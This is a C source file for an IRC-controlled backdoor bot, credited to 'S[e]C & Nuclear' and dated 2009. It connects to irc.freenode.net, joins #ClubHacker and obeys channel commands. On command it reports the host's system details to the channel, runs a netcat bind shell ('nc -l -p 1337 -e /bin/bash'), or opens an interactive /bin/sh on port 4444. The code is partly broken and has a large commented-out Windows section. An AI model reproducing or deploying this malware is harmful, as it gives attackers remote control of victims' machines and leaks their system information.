/*********************************/
/** Coded By: S[e]C  & Nuclear  **/
/** Date   : 2009              **/
/********************************/
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <linux/kernel.h>
/*#include <conio.h>
#include <winsock2.h>*/


#define PORT 6667
#define MAXBUFF 512
#define SERVER "irc.freenode.net"
#define PORTSHELL 4444
/*
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))
#define INFO_BUFFER_SIZE 32767
*/
/*
void privmsg(char *user,char *msg, ...);
void pong(const char *buffer);
*/

/*TCHAR* envVarStrings[] =
{
  TEXT("OS         = %OS%"),
  TEXT("PATH       = %PATH%"),
  TEXT("HOMEPATH   = %HOMEPATH%"),
  TEXT("TEMP       = %TEMP%")
};
*/
void privmsg(char *u,char *msg, ...);
/*void printError( TCHAR* msg );*/
int irc_parse(char *buffer);
void cmd_server(char *evento, ...);
int irc_send(char *msg, ...);
int irc_cmd(char *buffer,char *nicl);
void irc_read(void);
void getinfo(void);
int sock;

int main(void)
{
   /* WSADATA wsa_;*/
    struct hostent *host;
    struct sockaddr_in direc;
    char buffer[MAXBUFF];
    /*WSAStartup(MAKEWORD(2,2),&wsa_);*/
    host=gethostbyname(SERVER);
    sock=socket(AF_INET,SOCK_STREAM,0);
    if(sock==-1)
    {
      fprintf(stdout,"Error al crear socket\n");
      return (-1);
    }
 
    direc.sin_family=AF_INET;
    direc.sin_port=htons(PORT);
    direc.sin_addr=*((struct in_addr *)host->h_addr);
    memset(direc.sin_zero,0,8);
 
    if (connect(sock, (struct sockaddr *)&direc,sizeof(struct sockaddr)) == -1)
    {
              fprintf(stdout,"Error al conectar al servidor\n");
              return (-1);
    }
  
            fprintf(stdout,"Sending Nick...\n");
            if(irc_send("NICK Nuclearb0t\r\n")==1) fprintf(stdout,"Error al enviar comando!\n"); 
            fprintf(stdout,"Sending User...\n");
            if(irc_send("USER Nuclearb0t pruev night : nuclear01\r\n")==1) fprintf(stdout,"Error al enviar comando!\n"); 
            fprintf(stdout,"Joining Channel...\n");
            if(irc_send("JOIN #ClubHacker\r\n")==1) fprintf(stdout,"Error al enviar comando!\n"); 
           
    irc_read();
    irc_parse(buffer);
    /*WSACleanup();*/
    close(sock);
    return 0;   
}

/*int irc_send(char *buff)
{
	if(send(sock,buff,strlen(buff),0)<=0){
		return 1;
	}
	printf("%s\n",buff);
	return 0;
}
*/
/*void irc_recv(char *buff)
{
   while(1)
   {
      memset(buff, 0, sizeof(buff));
      while(recv(sock, buff, sizeof(buff), 0)>0)
      {
      fprintf(stdout,"%s",buff);
      }
   }
}*/



void cmd_server(char *evento, ...)
{
   va_list p;
   char buffer[MAXBUFF];
   va_start(p,evento);
   vsnprintf(buffer,sizeof(buffer),evento,p);
   va_end(p);
   strcat(buffer,"\r\n");
   irc_send(buffer);
}

/*
void privmsg(char *user,char *msg, ...)
{
   va_list p;
   char buffer[MAXBUFF],mensaje[MAXBUFF];
   va_start(p,msg);
   vsnprintf(buffer,sizeof(buffer),msg,p);
   va_end(p);
   sprintf(mensaje,"PRIVMSG %s :%s\r\n",user,buffer);
   if(irc_send(mensaje)==1) fprintf(stdout,"Error al enviar Mensaje!\n"); 
}
*/
/*
void pong(const char *buffer){
   char *token;
   char pong[64];
   token=strchr(buffer,':');
   sprintf(pong,"PONG %s\r\n",token);
   irc_send(pong);
}

*/
int irc_parse(char *buffer)
{
	char *buf = malloc(strlen(buffer) + 1);
	char nick[256], user[256], host[256], message[256];
	int len;

	
	/* parse through data to fill variables */
	if ((strstr(buffer, "PRIVMSG") == NULL) || (strncmp(buffer,":",1)))
		return 0;
	strcpy(buf, buffer+1);

	memset(&nick,0,sizeof(nick));
	memset(&user,0,sizeof(user));
	memset(&host,0,sizeof(host));
	memset(&message,0,sizeof(message));

	if ((len = strstr(buf, "!") - buf) < 1)
		return 0;
	strncpy(nick, buf, len);
	buf = buf+len+1;

	if ((len = strstr(buf, "@") - buf) < 1)
		return 0;
	strncpy(user, buf, len);
	buf = buf+len+1;

	if ((len = strstr(buf, " ") - buf) < 1)
		return 0;
	strncpy(host, buf, len);
	buf = buf+len+1;

	if ((len = strstr(buf, ":") - buf) < 1)
		return 0;
	buf = buf+len+1;
	strncpy(message,buf,strlen(buf)-1);

	irc_cmd(message,nick);
	return 0;
}

int irc_cmd(char *buffer,char *nick)
{

	/* make bot quit from server */
	if (!strcmp(buffer, ".quit"))
	{
        irc_send("PRIVMSG #ClubHacker GoodBye\r\n");
        cmd_server("QUIT : conexion cerrada");
        cmd_server("PART #ClubHacker");
	}
	if (!strcmp(buffer, ".getinfo"))
	{
        getinfo();
	}
	if (!strcmp(buffer, ".shellcat"))
	{
        shellcat();
	}
	if (!strcmp(buffer, ".shelltcp"))
	{
        shelltcp();
	}
   return 0;
}
void shellcat(void)
{
system("nc -l -p 1337 -e /bin/bash");
irc_send("PRIVMSG #ClubHacker Shell abierta...! \r\n");
}
void shelltcp(void)
{
int s1, s2, size = sizeof (struct sockaddr);
        struct sockaddr_in local, remote;
        char *args[] = {"/bin/sh", "-i", NULL};
        char *envp[] = {"TERM=xterm", "PS1=\\s-\\v\\$ ", "SHELL=/bin/sh", NULL};

        memset (&local, 0, size);
        memset (&remote, 0, size);

        local.sin_family        = AF_INET;
        local.sin_port          = htons (PORTSHELL);
        local.sin_addr.s_addr   = INADDR_ANY;

        if ((s1 = socket (AF_INET, SOCK_STREAM, IPPROTO_IP)) == -1) {
                perror ("socket() ");
                return -1;
        }
        if ((bind (s1, (struct sockaddr *)&local, size)) == -1) {
                perror ("bind() ");
                return -1;
        }
        if ((listen (s1, 3)) == -1) {
                perror ("listen() ");
                return -1;
        }
        if ((s2 = accept(s1, (struct sockaddr *)&remote, &size)) == -1) {
                perror ("accept() ");
                return -1;
        }

        close (STDIN_FILENO);
        close (STDOUT_FILENO);
        close (STDERR_FILENO);

        dup2(s2, STDIN_FILENO);
        dup2(s2, STDOUT_FILENO);
        dup2(s2, STDERR_FILENO);

        execve (args[0], args, envp);

        close (s2);
}
void irc_read(void)

{
	char buffer[512];
	char *result;

	while(1)
	{
		memset(buffer, 0, sizeof(buffer));
		if (!recv(sock, buffer, sizeof(buffer), 0))
		{
			  fprintf(stdout,"%s",buffer);
		}
		

		if ((result = strtok(buffer, "\n")) != NULL)
		{
			do
			{
				
					irc_parse(result);
			}while((result = strtok(NULL, "\n")) != NULL);
		}
	}
}

int irc_send(char *msg, ...)
{
	va_list va;
	char buf[512];

	va_start(va, msg);
	vsprintf(buf, msg, va);
	va_end(va);
	printf("#ClubHacker %s\n", buf);
	return send(sock, buf, strlen(buf), 0);
}

void getinfo(void)
{
 /*¡ DWORD i;
  TCHAR  infoBuf[INFO_BUFFER_SIZE];
  DWORD  bufCharCount = INFO_BUFFER_SIZE;
 
  // Get and display the name of the computer. 
  bufCharCount = INFO_BUFFER_SIZE;
  if( !GetComputerName( infoBuf, &bufCharCount ) )
    irc_send("PRIVMSG #txus_sala : Error GetComputerName");
  irc_send("PRIVMSG #txus_sala :Computer name      %s\r\n", infoBuf ); 
 
  // Get and display the user name. 
  bufCharCount = INFO_BUFFER_SIZE;
  if( !GetUserName( infoBuf, &bufCharCount ) )
    irc_send("PRIVMSG #txus_sala :Error GetUserName\r\n"); 
  irc_send("PRIVMSG #txus_sala :User name:          %s\r\n", infoBuf ); 
 
  // Get and display the system directory. 
  if( !GetSystemDirectory( infoBuf, INFO_BUFFER_SIZE ) )
    irc_send("PRIVMSG #txus_sala Error GetSystemDirectory\r\n"); 
 irc_send("PRIVMSG #txus_sala :System Directory:   %s\r\n", infoBuf ); 
 
  // Get and display the Windows directory. 
  if( !GetWindowsDirectory( infoBuf, INFO_BUFFER_SIZE ) )
    irc_send("PRIVMSG #txus_sala :Error GetWindowsDirectory\r\n"); 
  irc_send("PRIVMSG #txus_sala :Windows Directory:  %s\r\n", infoBuf ); 
 
  // Expand and display a few environment variables. 
  irc_send("PRIVMSG #txus_sala :Small selection of Environment Variables:\r\n"); 
  for( i = 0; i < ENV_VAR_STRING_COUNT; ++i )
  {
    bufCharCount = ExpandEnvironmentStrings(envVarStrings[i], infoBuf,
        INFO_BUFFER_SIZE ); 
    if( bufCharCount > INFO_BUFFER_SIZE )
      irc_send("PRICMSG #txus_sala :Buffer too small to expand: \"%s\")\r\n", 
              envVarStrings[i] );
    else if( !bufCharCount )
      irc_send("PRIVMSG #txus_sala :ExpandEnvironmentStrings\r\n");
    else
      irc_send("PRIVMSG #txus_sala :  %s\r\n", infoBuf );
  }*/
  struct utsname opcion;
struct sysinfo informacion;

int error;

error = uname(&opcion);



 if (error != 0)
 {
 printf ("eoer\n");
 }
 else
 {  
 if(irc_send("PRIVMSG #ClubHacker : Sistema %s \r\n",opcion.sysname)==1) fprintf(stdout,"Error al enviar comando!\n"); 
  if(irc_send("PRIVMSG #ClubHacker : Version Kernel Linux  %s. \r\n",opcion.release)==1) fprintf(stdout,"Error al enviar comando!\n"); 
   if(irc_send("PRIVMSG #ClubHacker : Arquitectura %s .\r\n",opcion.machine)==1) fprintf(stdout,"Error al enviar comando!\n"); 
    if(irc_send("PRIVMSG #ClubHacker : Nombre maquina %s .\r\n",opcion.nodename)==1) fprintf(stdout,"Error al enviar comando!\n"); 
    

 }
 if (sysinfo(&informacion)== -1)
 {
 printf("Error\n");
 }
 else
 {
    /*if(*/irc_send("PRIVMSG #ClubHacker : Numero de tiempo encendida %ld Hrs.\r\n",informacion.uptime/3600);/**)==1) fprintf(stdout,"Error al enviar comando!\n");*/ 

 }
}

/*void printError( TCHAR* msg )
{
  DWORD eNum;
  TCHAR sysMsg[256];
  TCHAR* p;

  eNum = GetLastError( );
  FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | 
         FORMAT_MESSAGE_IGNORE_INSERTS,
         NULL, eNum,
         MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
         sysMsg, 256, NULL );

  // Trim the end of the line and terminate it with a null
  p = sysMsg;
  while( ( *p > 31 ) || ( *p == 9 ) )
    ++p;
  do { *p-- = 0; } while( ( p >= sysMsg ) &&
                          ( ( *p == '.' ) || ( *p < 33 ) ) );

  // Display the message
  irc_send("PRIVMSG #txus_sala :%s failed with error %d (%s)\r\n", msg, eNum, sysMsg );
}*/
